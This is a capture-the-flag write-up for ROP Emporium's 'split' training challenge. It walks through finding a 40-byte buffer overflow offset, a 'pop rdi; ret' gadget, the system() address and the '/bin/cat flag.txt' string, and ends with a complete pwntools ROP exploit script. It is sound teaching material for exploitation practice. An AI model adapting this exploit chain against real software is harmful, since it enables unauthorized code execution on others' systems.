# split

Link: https://ropemporium.com/challenge/split.html

--------------------------

First we check if the offset is different than in the previous challenge, "ret2win". It seems it is still 40, with 41 characters we see only one "41" in RIP registry:

![a](images/Screenshot_1.jpg)

Then we find the gadget "pop rdi; ret" to set a value in registry RDI. This gadget is located in address "0x0000000000400883":

![a](images/Screenshot_2.jpg)

We can find the system address with objdump, located in "0x00000000004005e0":

![a](images/Screenshot_3.jpg)

Next, we need the address of the string "/bin/cat flag.txt". We can do this using GEF, and finding the address is "0x601060":

```
gdb -q ./split
break main
r
grep "/bin/cat flag.txt"
``` 

![a](images/Screenshot_4.jpg)

It seems to work:

![a](images/Screenshot_5.jpg)

Now we will change the calculation of some addresses and make it automatically with Python:

```
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] #0x0000000000400883
system = elf.sym["system"] #0x00000000004005e0
cat_flag = next(elf.search('/bin/cat flag.txt')) # 0x601060
rop = junk + p64(pop_rdi) + p64(cat_flag) + p64(system)
```

And it still works! Final exploit:

```
from pwn import *

context(arch='amd64', os='linux')
binary_name = 'split'
p = process('./'+binary_name)

junk =    "A"*40
elf = ELF(binary_name)
rop = ROP(elf)


pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] #0x0000000000400883
system = elf.sym["system"] #0x00000000004005e0
cat_flag = next(elf.search('/bin/cat flag.txt')) # 0x601060
rop = junk + p64(pop_rdi) + p64(cat_flag) + p64(system)

p.recvuntil("> ")
p.send(rop)
p.interactive()
```
